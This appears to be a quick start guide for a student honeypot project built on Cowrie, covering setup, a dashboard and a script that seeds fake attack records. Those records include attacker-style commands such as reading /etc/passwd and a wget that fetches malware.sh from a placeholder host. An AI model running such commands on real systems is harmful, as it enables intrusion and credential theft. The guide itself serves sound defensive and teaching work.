# Quick Start Guide

Get your honeypot up and running in 15 minutes!

## Local Development (No VPS Required)

Perfect for testing and development before deploying to production.

### 1. Clone and Install

```bash
# Clone repository
git clone <your-repo-url>
cd honeypot-project

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

### 2. Configure Environment

```bash
# Create environment file
cp .env.example .env
```

Edit `.env` and use SQLite for development (default in dev mode):
```bash
FLASK_ENV=development
# Database will be sqlite:///honeypot_dev.db automatically
```

### 3. Initialize Database

```bash
python scripts/setup_database.py
```

### 4. Generate Sample Data (Optional)

Since you don't have Cowrie running locally yet, let's add some sample data:

```python
# Create a file: scripts/add_sample_data.py
import sys
import os
from datetime import datetime, timedelta
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.database.db_manager import DatabaseManager

db = DatabaseManager()

# Sample data
countries = [
    ('China', 'CN', 39.9, 116.4),
    ('Russia', 'RU', 55.7, 37.6),
    ('United States', 'US', 38.9, -77.0),
    ('Brazil', 'BR', -15.8, -47.9),
    ('India', 'IN', 28.6, 77.2),
]

usernames = ['root', 'admin', 'user', 'test', 'ubuntu']
passwords = ['password', '123456', 'admin', 'root', '12345678']
commands = ['whoami', 'uname -a', 'ls', 'cat /etc/passwd', 'wget http://example.com/malware.sh']

print("Adding sample data...")

for i in range(50):
    country, cc, lat, lng = random.choice(countries)

    # Create attack
    attack_data = {
        'timestamp': datetime.utcnow() - timedelta(days=random.randint(0, 30)),
        'src_ip': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        'src_port': random.randint(40000, 60000),
        'dst_port': 2222,
        'session_id': f"session_{i}",
        'country': country,
        'country_code': cc,
        'latitude': lat + random.uniform(-5, 5),
        'longitude': lng + random.uniform(-5, 5),
    }

    attack = db.add_attack(attack_data)

    # Add login attempts
    for _ in range(random.randint(1, 5)):
        db.add_login_attempt({
            'attack_id': attack.id,
            'username': random.choice(usernames),
            'password': random.choice(passwords),
            'success': random.choice([True, False]),
            'timestamp': attack.timestamp,
        })

    # Add commands
    if random.random() > 0.3:
        for cmd in random.sample(commands, random.randint(1, 3)):
            db.add_command({
                'attack_id': attack.id,
                'command': cmd,
                'category': 'reconnaissance',
                'timestamp': attack.timestamp,
            })

print("✓ Sample data added!")
```

Run it:
```bash
python scripts/add_sample_data.py
```

### 5. Start Dashboard

```bash
python dashboard/app.py
```

Open your browser to: **http://localhost:5000**

You should see:
- Statistics cards with sample data
- Attack map with markers
- Charts showing attack trends
- Recent attack feed

## Production Deployment (VPS)

For real attack data, deploy to a VPS.

### Option 1: Automated Setup (Recommended)

```bash
# On your VPS (Ubuntu 22.04)
wget https://raw.githubusercontent.com/yourusername/honeypot-project/main/deployment/setup_vps.sh
sudo bash setup_vps.sh

# Install Cowrie
sudo su - honeypot
wget https://raw.githubusercontent.com/yourusername/honeypot-project/main/deployment/install_cowrie.sh
bash install_cowrie.sh
cd cowrie && bin/cowrie start
exit

# Deploy project
sudo su - honeypot
git clone <your-repo-url> honeypot-project
cd honeypot-project
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
cp .env.example .env
# Edit .env with your settings
python scripts/setup_database.py
python dashboard/app.py
```

### Option 2: Manual Setup

See [SETUP.md](SETUP.md) for detailed step-by-step instructions.

## Testing Your Honeypot

Once deployed, test it:

```bash
# From your local machine
ssh -p 2222 root@your-vps-ip

# Try these credentials:
# Username: root
# Password: password

# Run some commands:
whoami
uname -a
ls
cat /etc/passwd
```

Then check your dashboard - within 5 minutes you should see this attack appear!

## What to Expect

### First 24 Hours
- 10-50 automated scanner connections
- Mostly from China, Russia, Brazil
- Common credentials: root/root, admin/admin
- Basic reconnaissance commands

### First Week
- 500-2000 attacks
- Some successful logins
- Malware download attempts
- Cryptocurrency mining scripts
- DDoS bot recruitment

### First Month
- 10,000+ attacks
- Rich dataset for analysis
- Clear attack patterns
- Interesting malware samples

## Next Steps

1. **Review Data**: Check dashboard regularly
2. **Analyze Patterns**: Look for interesting attack chains
3. **Document Findings**: Write up attack case studies
4. **Share Results**: Create presentation for class
5. **Expand**: Add more honeypot types (HTTP, MySQL)

## Common Issues

### "No attacks showing up"
- Wait 24-48 hours for automated scanners to find you
- Make sure port 2222 is open in firewall
- Check Cowrie is running: `systemctl status cowrie`

### "Dashboard won't start"
- Check database connection in `.env`
- Run: `python scripts/setup_database.py`
- Check logs: `journalctl -u dashboard -f`

### "Charts not loading"
- Open browser console (F12) to see errors
- Check API endpoints: `curl http://localhost:5000/api/stats/summary`
- Ensure database has data

## Resources

- [SETUP.md](SETUP.md) - Detailed setup guide
- [ARCHITECTURE.md](../ARCHITECTURE.md) - Technical architecture
- [API.md](API.md) - API documentation
- [Cowrie Docs](https://github.com/cowrie/cowrie) - Honeypot documentation

## Need Help?

- Check GitHub Issues
- Review Cowrie troubleshooting guide
- Ask your instructor/classmates
- Post on cybersecurity forums

Happy hunting! 🍯
